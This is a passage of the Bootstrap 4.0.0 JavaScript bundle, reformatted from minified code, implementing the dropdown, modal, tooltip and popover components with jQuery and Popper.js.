                  null !== this._popper && this._popper.scheduleUpdate();
              }),
              (l._addEventListeners = function () {
                var e = this;
                t(this._element).on(u.CLICK, function (t) {
                  t.preventDefault(), t.stopPropagation(), e.toggle();
                });
              }),
              (l._getConfig = function (i) {
                return (
                  (i = o(
                    {},
                    this.constructor.Default,
                    t(this._element).data(),
                    i
                  )),
                  T.typeCheckConfig(e, i, this.constructor.DefaultType),
                  i
                );
              }),
              (l._getMenuElement = function () {
                if (!this._menu) {
                  var e = a._getParentFromElement(this._element);
                  this._menu = t(e).find(m)[0];
                }
                return this._menu;
              }),
              (l._getPlacement = function () {
                var e = t(this._element).parent(),
                  i = "bottom-start";
                return (
                  e.hasClass(p)
                    ? ((i = "top-start"),
                      t(this._menu).hasClass(f) && (i = "top-end"))
                    : e.hasClass("dropright")
                    ? (i = "right-start")
                    : e.hasClass("dropleft")
                    ? (i = "left-start")
                    : t(this._menu).hasClass(f) && (i = "bottom-end"),
                  i
                );
              }),
              (l._detectNavbar = function () {
                return t(this._element).closest(".navbar").length > 0;
              }),
              (l._getPopperConfig = function () {
                var t = this,
                  e = {};
                return (
                  "function" == typeof this._config.offset
                    ? (e.fn = function (e) {
                        return (
                          (e.offsets = o(
                            {},
                            e.offsets,
                            t._config.offset(e.offsets) || {}
                          )),
                          e
                        );
                      })
                    : (e.offset = this._config.offset),
                  {
                    placement: this._getPlacement(),
                    modifiers: {
                      offset: e,
                      flip: { enabled: this._config.flip },
                      preventOverflow: {
                        boundariesElement: this._config.boundary,
                      },
                    },
                  }
                );
              }),
              (a._jQueryInterface = function (e) {
                return this.each(function () {
                  var i = t(this).data(n);
                  if (
                    (i ||
                      ((i = new a(this, "object" == typeof e ? e : null)),
                      t(this).data(n, i)),
                    "string" == typeof e)
                  ) {
                    if (void 0 === i[e])
                      throw new TypeError('No method named "' + e + '"');
                    i[e]();
                  }
                });
              }),
              (a._clearMenus = function (e) {
                if (
                  !e ||
                  (3 !== e.which && ("keyup" !== e.type || 9 === e.which))
                )
                  for (var i = t.makeArray(t(g)), s = 0; s < i.length; s++) {
                    var o = a._getParentFromElement(i[s]),
                      r = t(i[s]).data(n),
                      l = { relatedTarget: i[s] };
                    if (r) {
                      var c = r._menu;
                      if (
                        t(o).hasClass(h) &&
                        !(
                          e &&
                          (("click" === e.type &&
                            /input|textarea/i.test(e.target.tagName)) ||
                            ("keyup" === e.type && 9 === e.which)) &&
                          t.contains(o, e.target)
                        )
                      ) {
                        var d = t.Event(u.HIDE, l);
                        t(o).trigger(d),
                          d.isDefaultPrevented() ||
                            ("ontouchstart" in document.documentElement &&
                              t("body")
                                .children()
                                .off("mouseover", null, t.noop),
                            i[s].setAttribute("aria-expanded", "false"),
                            t(c).removeClass(h),
                            t(o).removeClass(h).trigger(t.Event(u.HIDDEN, l)));
                      }
                    }
                  }
              }),
              (a._getParentFromElement = function (e) {
                var i,
                  n = T.getSelectorFromElement(e);
                return n && (i = t(n)[0]), i || e.parentNode;
              }),
              (a._dataApiKeydownHandler = function (e) {
                if (
                  (/input|textarea/i.test(e.target.tagName)
                    ? !(
                        32 === e.which ||
                        (27 !== e.which &&
                          ((40 !== e.which && 38 !== e.which) ||
                            t(e.target).closest(m).length))
                      )
                    : c.test(e.which)) &&
                  (e.preventDefault(),
                  e.stopPropagation(),
                  !this.disabled && !t(this).hasClass(d))
                ) {
                  var i = a._getParentFromElement(this),
                    n = t(i).hasClass(h);
                  if (
                    (n || (27 === e.which && 32 === e.which)) &&
                    (!n || (27 !== e.which && 32 !== e.which))
                  ) {
                    var s = t(i)
                      .find(".dropdown-menu .dropdown-item:not(.disabled)")
                      .get();
                    if (0 !== s.length) {
                      var o = s.indexOf(e.target);
                      38 === e.which && o > 0 && o--,
                        40 === e.which && o < s.length - 1 && o++,
                        o < 0 && (o = 0),
                        s[o].focus();
                    }
                  } else {
                    if (27 === e.which) {
                      var r = t(i).find(g)[0];
                      t(r).trigger("focus");
                    }
                    t(this).trigger("click");
                  }
                }
              }),
              s(a, null, [
                {
                  key: "VERSION",
                  get: function () {
                    return "4.0.0";
                  },
                },
                {
                  key: "Default",
                  get: function () {
                    return v;
                  },
                },
                {
                  key: "DefaultType",
                  get: function () {
                    return y;
                  },
                },
              ]),
              a
            );
          })();
        return (
          t(document)
            .on(u.KEYDOWN_DATA_API, g, _._dataApiKeydownHandler)
            .on(u.KEYDOWN_DATA_API, m, _._dataApiKeydownHandler)
            .on(u.CLICK_DATA_API + " " + u.KEYUP_DATA_API, _._clearMenus)
            .on(u.CLICK_DATA_API, g, function (e) {
              e.preventDefault(),
                e.stopPropagation(),
                _._jQueryInterface.call(t(this), "toggle");
            })
            .on(u.CLICK_DATA_API, ".dropdown form", function (t) {
              t.stopPropagation();
            }),
          (t.fn[e] = _._jQueryInterface),
          (t.fn[e].Constructor = _),
          (t.fn[e].noConflict = function () {
            return (t.fn[e] = l), _._jQueryInterface;
          }),
          _
        );
      })(e),
      I = (function (t) {
        var e = "bs.modal",
          i = "." + e,
          n = t.fn.modal,
          r = { backdrop: !0, keyboard: !0, focus: !0, show: !0 },
          a = {
            backdrop: "(boolean|string)",
            keyboard: "boolean",
            focus: "boolean",
            show: "boolean",
          },
          l = {
            HIDE: "hide" + i,
            HIDDEN: "hidden" + i,
            SHOW: "show" + i,
            SHOWN: "shown" + i,
            FOCUSIN: "focusin" + i,
            RESIZE: "resize" + i,
            CLICK_DISMISS: "click.dismiss" + i,
            KEYDOWN_DISMISS: "keydown.dismiss" + i,
            MOUSEUP_DISMISS: "mouseup.dismiss" + i,
            MOUSEDOWN_DISMISS: "mousedown.dismiss" + i,
            CLICK_DATA_API: "click" + i + ".data-api",
          },
          c = "modal-open",
          u = "fade",
          d = "show",
          h = ".modal-dialog",
          p = '[data-toggle="modal"]',
          f = '[data-dismiss="modal"]',
          g = ".fixed-top, .fixed-bottom, .is-fixed, .sticky-top",
          m = ".sticky-top",
          v = ".navbar-toggler",
          y = (function () {
            function n(e, i) {
              (this._config = this._getConfig(i)),
                (this._element = e),
                (this._dialog = t(e).find(h)[0]),
                (this._backdrop = null),
                (this._isShown = !1),
                (this._isBodyOverflowing = !1),
                (this._ignoreBackdropClick = !1),
                (this._originalBodyPadding = 0),
                (this._scrollbarWidth = 0);
            }
            var p = n.prototype;
            return (
              (p.toggle = function (t) {
                return this._isShown ? this.hide() : this.show(t);
              }),
              (p.show = function (e) {
                var i = this;
                if (!this._isTransitioning && !this._isShown) {
                  T.supportsTransitionEnd() &&
                    t(this._element).hasClass(u) &&
                    (this._isTransitioning = !0);
                  var n = t.Event(l.SHOW, { relatedTarget: e });
                  t(this._element).trigger(n),
                    this._isShown ||
                      n.isDefaultPrevented() ||
                      ((this._isShown = !0),
                      this._checkScrollbar(),
                      this._setScrollbar(),
                      this._adjustDialog(),
                      t(document.body).addClass(c),
                      this._setEscapeEvent(),
                      this._setResizeEvent(),
                      t(this._element).on(l.CLICK_DISMISS, f, function (t) {
                        return i.hide(t);
                      }),
                      t(this._dialog).on(l.MOUSEDOWN_DISMISS, function () {
                        t(i._element).one(l.MOUSEUP_DISMISS, function (e) {
                          t(e.target).is(i._element) &&
                            (i._ignoreBackdropClick = !0);
                        });
                      }),
                      this._showBackdrop(function () {
                        return i._showElement(e);
                      }));
                }
              }),
              (p.hide = function (e) {
                var i = this;
                if (
                  (e && e.preventDefault(),
                  !this._isTransitioning && this._isShown)
                ) {
                  var n = t.Event(l.HIDE);
                  if (
                    (t(this._element).trigger(n),
                    this._isShown && !n.isDefaultPrevented())
                  ) {
                    this._isShown = !1;
                    var s =
                      T.supportsTransitionEnd() && t(this._element).hasClass(u);
                    s && (this._isTransitioning = !0),
                      this._setEscapeEvent(),
                      this._setResizeEvent(),
                      t(document).off(l.FOCUSIN),
                      t(this._element).removeClass(d),
                      t(this._element).off(l.CLICK_DISMISS),
                      t(this._dialog).off(l.MOUSEDOWN_DISMISS),
                      s
                        ? t(this._element)
                            .one(T.TRANSITION_END, function (t) {
                              return i._hideModal(t);
                            })
                            .emulateTransitionEnd(300)
                        : this._hideModal();
                  }
                }
              }),
              (p.dispose = function () {
                t.removeData(this._element, e),
                  t(window, document, this._element, this._backdrop).off(i),
                  (this._config = null),
                  (this._element = null),
                  (this._dialog = null),
                  (this._backdrop = null),
                  (this._isShown = null),
                  (this._isBodyOverflowing = null),
                  (this._ignoreBackdropClick = null),
                  (this._scrollbarWidth = null);
              }),
              (p.handleUpdate = function () {
                this._adjustDialog();
              }),
              (p._getConfig = function (t) {
                return (t = o({}, r, t)), T.typeCheckConfig("modal", t, a), t;
              }),
              (p._showElement = function (e) {
                var i = this,
                  n = T.supportsTransitionEnd() && t(this._element).hasClass(u);
                (this._element.parentNode &&
                  this._element.parentNode.nodeType === Node.ELEMENT_NODE) ||
                  document.body.appendChild(this._element),
                  (this._element.style.display = "block"),
                  this._element.removeAttribute("aria-hidden"),
                  (this._element.scrollTop = 0),
                  n && T.reflow(this._element),
                  t(this._element).addClass(d),
                  this._config.focus && this._enforceFocus();
                var s = t.Event(l.SHOWN, { relatedTarget: e }),
                  o = function () {
                    i._config.focus && i._element.focus(),
                      (i._isTransitioning = !1),
                      t(i._element).trigger(s);
                  };
                n
                  ? t(this._dialog)
                      .one(T.TRANSITION_END, o)
                      .emulateTransitionEnd(300)
                  : o();
              }),
              (p._enforceFocus = function () {
                var e = this;
                t(document)
                  .off(l.FOCUSIN)
                  .on(l.FOCUSIN, function (i) {
                    document !== i.target &&
                      e._element !== i.target &&
                      0 === t(e._element).has(i.target).length &&
                      e._element.focus();
                  });
              }),
              (p._setEscapeEvent = function () {
                var e = this;
                this._isShown && this._config.keyboard
                  ? t(this._element).on(l.KEYDOWN_DISMISS, function (t) {
                      27 === t.which && (t.preventDefault(), e.hide());
                    })
                  : this._isShown || t(this._element).off(l.KEYDOWN_DISMISS);
              }),
              (p._setResizeEvent = function () {
                var e = this;
                this._isShown
                  ? t(window).on(l.RESIZE, function (t) {
                      return e.handleUpdate(t);
                    })
                  : t(window).off(l.RESIZE);
              }),
              (p._hideModal = function () {
                var e = this;
                (this._element.style.display = "none"),
                  this._element.setAttribute("aria-hidden", !0),
                  (this._isTransitioning = !1),
                  this._showBackdrop(function () {
                    t(document.body).removeClass(c),
                      e._resetAdjustments(),
                      e._resetScrollbar(),
                      t(e._element).trigger(l.HIDDEN);
                  });
              }),
              (p._removeBackdrop = function () {
                this._backdrop &&
                  (t(this._backdrop).remove(), (this._backdrop = null));
              }),
              (p._showBackdrop = function (e) {
                var i = this,
                  n = t(this._element).hasClass(u) ? u : "";
                if (this._isShown && this._config.backdrop) {
                  var s = T.supportsTransitionEnd() && n;
                  if (
                    ((this._backdrop = document.createElement("div")),
                    (this._backdrop.className = "modal-backdrop"),
                    n && t(this._backdrop).addClass(n),
                    t(this._backdrop).appendTo(document.body),
                    t(this._element).on(l.CLICK_DISMISS, function (t) {
                      i._ignoreBackdropClick
                        ? (i._ignoreBackdropClick = !1)
                        : t.target === t.currentTarget &&
                          ("static" === i._config.backdrop
                            ? i._element.focus()
                            : i.hide());
                    }),
                    s && T.reflow(this._backdrop),
                    t(this._backdrop).addClass(d),
                    !e)
                  )
                    return;
                  if (!s) return void e();
                  t(this._backdrop)
                    .one(T.TRANSITION_END, e)
                    .emulateTransitionEnd(150);
                } else if (!this._isShown && this._backdrop) {
                  t(this._backdrop).removeClass(d);
                  var o = function () {
                    i._removeBackdrop(), e && e();
                  };
                  T.supportsTransitionEnd() && t(this._element).hasClass(u)
                    ? t(this._backdrop)
                        .one(T.TRANSITION_END, o)
                        .emulateTransitionEnd(150)
                    : o();
                } else e && e();
              }),
              (p._adjustDialog = function () {
                var t =
                  this._element.scrollHeight >
                  document.documentElement.clientHeight;
                !this._isBodyOverflowing &&
                  t &&
                  (this._element.style.paddingLeft =
                    this._scrollbarWidth + "px"),
                  this._isBodyOverflowing &&
                    !t &&
                    (this._element.style.paddingRight =
                      this._scrollbarWidth + "px");
              }),
              (p._resetAdjustments = function () {
                (this._element.style.paddingLeft = ""),
                  (this._element.style.paddingRight = "");
              }),
              (p._checkScrollbar = function () {
                var t = document.body.getBoundingClientRect();
                (this._isBodyOverflowing =
                  t.left + t.right < window.innerWidth),
                  (this._scrollbarWidth = this._getScrollbarWidth());
              }),
              (p._setScrollbar = function () {
                var e = this;
                if (this._isBodyOverflowing) {
                  t(g).each(function (i, n) {
                    var s = t(n)[0].style.paddingRight,
                      o = t(n).css("padding-right");
                    t(n)
                      .data("padding-right", s)
                      .css(
                        "padding-right",
                        parseFloat(o) + e._scrollbarWidth + "px"
                      );
                  }),
                    t(m).each(function (i, n) {
                      var s = t(n)[0].style.marginRight,
                        o = t(n).css("margin-right");
                      t(n)
                        .data("margin-right", s)
                        .css(
                          "margin-right",
                          parseFloat(o) - e._scrollbarWidth + "px"
                        );
                    }),
                    t(v).each(function (i, n) {
                      var s = t(n)[0].style.marginRight,
                        o = t(n).css("margin-right");
                      t(n)
                        .data("margin-right", s)
                        .css(
                          "margin-right",
                          parseFloat(o) + e._scrollbarWidth + "px"
                        );
                    });
                  var i = document.body.style.paddingRight,
                    n = t("body").css("padding-right");
                  t("body")
                    .data("padding-right", i)
                    .css(
                      "padding-right",
                      parseFloat(n) + this._scrollbarWidth + "px"
                    );
                }
              }),
              (p._resetScrollbar = function () {
                t(g).each(function (e, i) {
                  var n = t(i).data("padding-right");
                  void 0 !== n &&
                    t(i).css("padding-right", n).removeData("padding-right");
                }),
                  t(m + ", " + v).each(function (e, i) {
                    var n = t(i).data("margin-right");
                    void 0 !== n &&
                      t(i).css("margin-right", n).removeData("margin-right");
                  });
                var e = t("body").data("padding-right");
                void 0 !== e &&
                  t("body").css("padding-right", e).removeData("padding-right");
              }),
              (p._getScrollbarWidth = function () {
                var t = document.createElement("div");
                (t.className = "modal-scrollbar-measure"),
                  document.body.appendChild(t);
                var e = t.getBoundingClientRect().width - t.clientWidth;
                return document.body.removeChild(t), e;
              }),
              (n._jQueryInterface = function (i, s) {
                return this.each(function () {
                  var r = t(this).data(e),
                    a = o(
                      {},
                      n.Default,
                      t(this).data(),
                      "object" == typeof i && i
                    );
                  if (
                    (r || ((r = new n(this, a)), t(this).data(e, r)),
                    "string" == typeof i)
                  ) {
                    if (void 0 === r[i])
                      throw new TypeError('No method named "' + i + '"');
                    r[i](s);
                  } else a.show && r.show(s);
                });
              }),
              s(n, null, [
                {
                  key: "VERSION",
                  get: function () {
                    return "4.0.0";
                  },
                },
                {
                  key: "Default",
                  get: function () {
                    return r;
                  },
                },
              ]),
              n
            );
          })();
        return (
          t(document).on(l.CLICK_DATA_API, p, function (i) {
            var n,
              s = this,
              r = T.getSelectorFromElement(this);
            r && (n = t(r)[0]);
            var a = t(n).data(e)
              ? "toggle"
              : o({}, t(n).data(), t(this).data());
            ("A" !== this.tagName && "AREA" !== this.tagName) ||
              i.preventDefault();
            var c = t(n).one(l.SHOW, function (e) {
              e.isDefaultPrevented() ||
                c.one(l.HIDDEN, function () {
                  t(s).is(":visible") && s.focus();
                });
            });
            y._jQueryInterface.call(t(n), a, this);
          }),
          (t.fn.modal = y._jQueryInterface),
          (t.fn.modal.Constructor = y),
          (t.fn.modal.noConflict = function () {
            return (t.fn.modal = n), y._jQueryInterface;
          }),
          y
        );
      })(e),
      $ = (function (t) {
        var e = "tooltip",
          n = "bs.tooltip",
          r = "." + n,
          a = t.fn[e],
          l = new RegExp("(^|\\s)bs-tooltip\\S+", "g"),
          c = {
            animation: "boolean",
            template: "string",
            title: "(string|element|function)",
            trigger: "string",
            delay: "(number|object)",
            html: "boolean",
            selector: "(string|boolean)",
            placement: "(string|function)",
            offset: "(number|string)",
            container: "(string|element|boolean)",
            fallbackPlacement: "(string|array)",
            boundary: "(string|element)",
          },
          u = {
            AUTO: "auto",
            TOP: "top",
            RIGHT: "right",
            BOTTOM: "bottom",
            LEFT: "left",
          },
          d = {
            animation: !0,
            template:
              '<div class="tooltip" role="tooltip"><div class="arrow"></div><div class="tooltip-inner"></div></div>',
            trigger: "hover focus",
            title: "",
            delay: 0,
            html: !1,
            selector: !1,
            placement: "top",
            offset: 0,
            container: !1,
            fallbackPlacement: "flip",
            boundary: "scrollParent",
          },
          h = "show",
          p = "out",
          f = {
            HIDE: "hide" + r,
            HIDDEN: "hidden" + r,
            SHOW: "show" + r,
            SHOWN: "shown" + r,
            INSERTED: "inserted" + r,
            CLICK: "click" + r,
            FOCUSIN: "focusin" + r,
            FOCUSOUT: "focusout" + r,
            MOUSEENTER: "mouseenter" + r,
            MOUSELEAVE: "mouseleave" + r,
          },
          g = "fade",
          m = "show",
          v = "hover",
          y = "focus",
          _ = (function () {
            function a(t, e) {
              if (void 0 === i)
                throw new TypeError(
                  "Bootstrap tooltips require Popper.js (https://popper.js.org)"
                );
              (this._isEnabled = !0),
                (this._timeout = 0),
                (this._hoverState = ""),
                (this._activeTrigger = {}),
                (this._popper = null),
                (this.element = t),
                (this.config = this._getConfig(e)),
                (this.tip = null),
                this._setListeners();
            }
            var _ = a.prototype;
            return (
              (_.enable = function () {
                this._isEnabled = !0;
              }),
              (_.disable = function () {
                this._isEnabled = !1;
              }),
              (_.toggleEnabled = function () {
                this._isEnabled = !this._isEnabled;
              }),
              (_.toggle = function (e) {
                if (this._isEnabled)
                  if (e) {
                    var i = this.constructor.DATA_KEY,
                      n = t(e.currentTarget).data(i);
                    n ||
                      ((n = new this.constructor(
                        e.currentTarget,
                        this._getDelegateConfig()
                      )),
                      t(e.currentTarget).data(i, n)),
                      (n._activeTrigger.click = !n._activeTrigger.click),
                      n._isWithActiveTrigger()
                        ? n._enter(null, n)
                        : n._leave(null, n);
                  } else {
                    if (t(this.getTipElement()).hasClass(m))
                      return void this._leave(null, this);
                    this._enter(null, this);
                  }
              }),
              (_.dispose = function () {
                clearTimeout(this._timeout),
                  t.removeData(this.element, this.constructor.DATA_KEY),
                  t(this.element).off(this.constructor.EVENT_KEY),
                  t(this.element).closest(".modal").off("hide.bs.modal"),
                  this.tip && t(this.tip).remove(),
                  (this._isEnabled = null),
                  (this._timeout = null),
                  (this._hoverState = null),
                  (this._activeTrigger = null),
                  null !== this._popper && this._popper.destroy(),
                  (this._popper = null),
                  (this.element = null),
                  (this.config = null),
                  (this.tip = null);
              }),
              (_.show = function () {
                var e = this;
                if ("none" === t(this.element).css("display"))
                  throw new Error("Please use show on visible elements");
                var n = t.Event(this.constructor.Event.SHOW);
                if (this.isWithContent() && this._isEnabled) {
                  t(this.element).trigger(n);
                  var s = t.contains(
                    this.element.ownerDocument.documentElement,
                    this.element
                  );
                  if (n.isDefaultPrevented() || !s) return;
                  var o = this.getTipElement(),
                    r = T.getUID(this.constructor.NAME);
                  o.setAttribute("id", r),
                    this.element.setAttribute("aria-describedby", r),
                    this.setContent(),
                    this.config.animation && t(o).addClass(g);
                  var l =
                      "function" == typeof this.config.placement
                        ? this.config.placement.call(this, o, this.element)
                        : this.config.placement,
                    c = this._getAttachment(l);
                  this.addAttachmentClass(c);
                  var u =
                    !1 === this.config.container
                      ? document.body
                      : t(this.config.container);
                  t(o).data(this.constructor.DATA_KEY, this),
                    t.contains(
                      this.element.ownerDocument.documentElement,
                      this.tip
                    ) || t(o).appendTo(u),
                    t(this.element).trigger(this.constructor.Event.INSERTED),
                    (this._popper = new i(this.element, o, {
                      placement: c,
                      modifiers: {
                        offset: { offset: this.config.offset },
                        flip: { behavior: this.config.fallbackPlacement },
                        arrow: { element: ".arrow" },
                        preventOverflow: {
                          boundariesElement: this.config.boundary,
                        },
                      },
                      onCreate: function (t) {
                        t.originalPlacement !== t.placement &&
                          e._handlePopperPlacementChange(t);
                      },
                      onUpdate: function (t) {
                        e._handlePopperPlacementChange(t);
                      },
                    })),
                    t(o).addClass(m),
                    "ontouchstart" in document.documentElement &&
                      t("body").children().on("mouseover", null, t.noop);
                  var d = function () {
                    e.config.animation && e._fixTransition();
                    var i = e._hoverState;
                    (e._hoverState = null),
                      t(e.element).trigger(e.constructor.Event.SHOWN),
                      i === p && e._leave(null, e);
                  };
                  T.supportsTransitionEnd() && t(this.tip).hasClass(g)
                    ? t(this.tip)
                        .one(T.TRANSITION_END, d)
                        .emulateTransitionEnd(a._TRANSITION_DURATION)
                    : d();
                }
              }),
              (_.hide = function (e) {
                var i = this,
                  n = this.getTipElement(),
                  s = t.Event(this.constructor.Event.HIDE),
                  o = function () {
                    i._hoverState !== h &&
                      n.parentNode &&
                      n.parentNode.removeChild(n),
                      i._cleanTipClass(),
                      i.element.removeAttribute("aria-describedby"),
                      t(i.element).trigger(i.constructor.Event.HIDDEN),
                      null !== i._popper && i._popper.destroy(),
                      e && e();
                  };
                t(this.element).trigger(s),
                  s.isDefaultPrevented() ||
                    (t(n).removeClass(m),
                    "ontouchstart" in document.documentElement &&
                      t("body").children().off("mouseover", null, t.noop),
                    (this._activeTrigger.click = !1),
                    (this._activeTrigger[y] = !1),
                    (this._activeTrigger[v] = !1),
                    T.supportsTransitionEnd() && t(this.tip).hasClass(g)
                      ? t(n).one(T.TRANSITION_END, o).emulateTransitionEnd(150)
                      : o(),
                    (this._hoverState = ""));
              }),
              (_.update = function () {
                null !== this._popper && this._popper.scheduleUpdate();
              }),
              (_.isWithContent = function () {
                return Boolean(this.getTitle());
              }),
              (_.addAttachmentClass = function (e) {
                t(this.getTipElement()).addClass("bs-tooltip-" + e);
              }),
              (_.getTipElement = function () {
                return (
                  (this.tip = this.tip || t(this.config.template)[0]), this.tip
                );
              }),
              (_.setContent = function () {
                var e = t(this.getTipElement());
                this.setElementContent(
                  e.find(".tooltip-inner"),
                  this.getTitle()
                ),
                  e.removeClass(g + " " + m);
              }),
              (_.setElementContent = function (e, i) {
                var n = this.config.html;
                "object" == typeof i && (i.nodeType || i.jquery)
                  ? n
                    ? t(i).parent().is(e) || e.empty().append(i)
                    : e.text(t(i).text())
                  : e[n ? "html" : "text"](i);
              }),
              (_.getTitle = function () {
                var t = this.element.getAttribute("data-original-title");
                return (
                  t ||
                    (t =
                      "function" == typeof this.config.title
                        ? this.config.title.call(this.element)
                        : this.config.title),
                  t
                );
              }),
              (_._getAttachment = function (t) {
                return u[t.toUpperCase()];
              }),
              (_._setListeners = function () {
                var e = this;
                this.config.trigger.split(" ").forEach(function (i) {
                  if ("click" === i)
                    t(e.element).on(
                      e.constructor.Event.CLICK,
                      e.config.selector,
                      function (t) {
                        return e.toggle(t);
                      }
                    );
                  else if ("manual" !== i) {
                    var n =
                        i === v
                          ? e.constructor.Event.MOUSEENTER
                          : e.constructor.Event.FOCUSIN,
                      s =
                        i === v
                          ? e.constructor.Event.MOUSELEAVE
                          : e.constructor.Event.FOCUSOUT;
                    t(e.element)
                      .on(n, e.config.selector, function (t) {
                        return e._enter(t);
                      })
                      .on(s, e.config.selector, function (t) {
                        return e._leave(t);
                      });
                  }
                  t(e.element)
                    .closest(".modal")
                    .on("hide.bs.modal", function () {
                      return e.hide();
                    });
                }),
                  this.config.selector
                    ? (this.config = o({}, this.config, {
                        trigger: "manual",
                        selector: "",
                      }))
                    : this._fixTitle();
              }),
              (_._fixTitle = function () {
                var t = typeof this.element.getAttribute("data-original-title");
                (this.element.getAttribute("title") || "string" !== t) &&
                  (this.element.setAttribute(
                    "data-original-title",
                    this.element.getAttribute("title") || ""
                  ),
                  this.element.setAttribute("title", ""));
              }),
              (_._enter = function (e, i) {
                var n = this.constructor.DATA_KEY;
                (i = i || t(e.currentTarget).data(n)) ||
                  ((i = new this.constructor(
                    e.currentTarget,
                    this._getDelegateConfig()
                  )),
                  t(e.currentTarget).data(n, i)),
                  e && (i._activeTrigger["focusin" === e.type ? y : v] = !0),
                  t(i.getTipElement()).hasClass(m) || i._hoverState === h
                    ? (i._hoverState = h)
                    : (clearTimeout(i._timeout),
                      (i._hoverState = h),
                      i.config.delay && i.config.delay.show
                        ? (i._timeout = setTimeout(function () {
                            i._hoverState === h && i.show();
                          }, i.config.delay.show))
                        : i.show());
              }),
              (_._leave = function (e, i) {
                var n = this.constructor.DATA_KEY;
                (i = i || t(e.currentTarget).data(n)) ||
                  ((i = new this.constructor(
                    e.currentTarget,
                    this._getDelegateConfig()
                  )),
                  t(e.currentTarget).data(n, i)),
                  e && (i._activeTrigger["focusout" === e.type ? y : v] = !1),
                  i._isWithActiveTrigger() ||
                    (clearTimeout(i._timeout),
                    (i._hoverState = p),
                    i.config.delay && i.config.delay.hide
                      ? (i._timeout = setTimeout(function () {
                          i._hoverState === p && i.hide();
                        }, i.config.delay.hide))
                      : i.hide());
              }),
              (_._isWithActiveTrigger = function () {
                for (var t in this._activeTrigger)
                  if (this._activeTrigger[t]) return !0;
                return !1;
              }),
              (_._getConfig = function (i) {
                return (
                  "number" ==
                    typeof (i = o(
                      {},
                      this.constructor.Default,
                      t(this.element).data(),
                      i
                    )).delay && (i.delay = { show: i.delay, hide: i.delay }),
                  "number" == typeof i.title && (i.title = i.title.toString()),
                  "number" == typeof i.content &&
                    (i.content = i.content.toString()),
                  T.typeCheckConfig(e, i, this.constructor.DefaultType),
                  i
                );
              }),
              (_._getDelegateConfig = function () {
                var t = {};
                if (this.config)
                  for (var e in this.config)
                    this.constructor.Default[e] !== this.config[e] &&
                      (t[e] = this.config[e]);
                return t;
              }),
              (_._cleanTipClass = function () {
                var e = t(this.getTipElement()),
                  i = e.attr("class").match(l);
                null !== i && i.length > 0 && e.removeClass(i.join(""));
              }),
              (_._handlePopperPlacementChange = function (t) {
                this._cleanTipClass(),
                  this.addAttachmentClass(this._getAttachment(t.placement));
              }),
              (_._fixTransition = function () {
                var e = this.getTipElement(),
                  i = this.config.animation;
                null === e.getAttribute("x-placement") &&
                  (t(e).removeClass(g),
                  (this.config.animation = !1),
                  this.hide(),
                  this.show(),
                  (this.config.animation = i));
              }),
              (a._jQueryInterface = function (e) {
                return this.each(function () {
                  var i = t(this).data(n),
                    s = "object" == typeof e && e;
                  if (
                    (i || !/dispose|hide/.test(e)) &&
                    (i || ((i = new a(this, s)), t(this).data(n, i)),
                    "string" == typeof e)
                  ) {
                    if (void 0 === i[e])
                      throw new TypeError('No method named "' + e + '"');
                    i[e]();
                  }
                });
              }),
              s(a, null, [
                {
                  key: "VERSION",
                  get: function () {
                    return "4.0.0";
                  },
                },
                {
                  key: "Default",
                  get: function () {
                    return d;
                  },
                },
                {
                  key: "NAME",
                  get: function () {
                    return e;
                  },
                },
                {
                  key: "DATA_KEY",
                  get: function () {
                    return n;
                  },
                },
                {
                  key: "Event",
                  get: function () {
                    return f;
                  },
                },
                {
                  key: "EVENT_KEY",
                  get: function () {
                    return r;
                  },
                },
                {
                  key: "DefaultType",
                  get: function () {
                    return c;
                  },
                },
              ]),
              a
            );
          })();
        return (
          (t.fn[e] = _._jQueryInterface),
          (t.fn[e].Constructor = _),
          (t.fn[e].noConflict = function () {
            return (t.fn[e] = a), _._jQueryInterface;
          }),
          _
        );
      })(e),
      O = (function (t) {
        var e = "popover",
          i = "bs.popover",
          n = "." + i,
          r = t.fn[e],
          a = new RegExp("(^|\\s)bs-popover\\S+", "g"),
          l = o({}, $.Default, {
            placement: "right",
            trigger: "click",
            content: "",
            template:
              '<div class="popover" role="tooltip"><div class="arrow"></div><h3 class="popover-header"></h3><div class="popover-body"></div></div>',
          }),
          c = o({}, $.DefaultType, { content: "(string|element|function)" }),
          u = {
            HIDE: "hide" + n,
            HIDDEN: "hidden" + n,
            SHOW: "show" + n,
            SHOWN: "shown" + n,
            INSERTED: "inserted" + n,
            CLICK: "click" + n,
            FOCUSIN: "focusin" + n,
            FOCUSOUT: "focusout" + n,
            MOUSEENTER: "mouseenter" + n,
            MOUSELEAVE: "mouseleave" + n,
          },
          d = (function (o) {
            var r, d;
            function h() {
              return o.apply(this, arguments) || this;
            }
            (d = o),
              ((r = h).prototype = Object.create(d.prototype)),
              (r.prototype.constructor = r),
              (r.__proto__ = d);
            var p = h.prototype;
            return (
              (p.isWithContent = function () {
                return this.getTitle() || this._getContent();
              }),
              (p.addAttachmentClass = function (e) {
                t(this.getTipElement()).addClass("bs-popover-" + e);
              }),
              (p.getTipElement = function () {
                return (
                  (this.tip = this.tip || t(this.config.template)[0]), this.tip
                );
              }),
              (p.setContent = function () {
                var e = t(this.getTipElement());
                this.setElementContent(
                  e.find(".popover-header"),
                  this.getTitle()
                );
                var i = this._getContent();
                "function" == typeof i && (i = i.call(this.element)),
                  this.setElementContent(e.find(".popover-body"), i),
                  e.removeClass("fade show");
              }),
              (p._getContent = function () {
                return (
                  this.element.getAttribute("data-content") ||
                  this.config.content
                );
              }),
              (p._cleanTipClass = function () {
                var e = t(this.getTipElement()),
                  i = e.attr("class").match(a);
                null !== i && i.length > 0 && e.removeClass(i.join(""));
              }),
              (h._jQueryInterface = function (e) {
                return this.each(function () {
                  var n = t(this).data(i),
                    s = "object" == typeof e ? e : null;
                  if (
                    (n || !/destroy|hide/.test(e)) &&
                    (n || ((n = new h(this, s)), t(this).data(i, n)),
                    "string" == typeof e)
                  ) {
                    if (void 0 === n[e])
                      throw new TypeError('No method named "' + e + '"');
                    n[e]();
                  }
                });
              }),
              s(h, null, [
                {
                  key: "VERSION",
                  get: function () {
                    return "4.0.0";
                  },
                },
                {
                  key: "Default",
                  get: function () {
                    return l;
                  },
                },
                {
                  key: "NAME",
                  get: function () {
                    return e;
                  },
                },
                {
                  key: "DATA_KEY",
                  get: function () {
                    return i;
                  },
                },
                {
                  key: "Event",
                  get: function () {
                    return u;
                  },
                },
                {
                  key: "EVENT_KEY",
                  get: function () {
                    return n;
                  },
                },
                {
                  key: "DefaultType",
                  get: function () {
                    return c;
                  },
                },
              ]),
              h
            );
          })($);
        return (
          (t.fn[e] = d._jQueryInterface),
          (t.fn[e].Constructor = d),
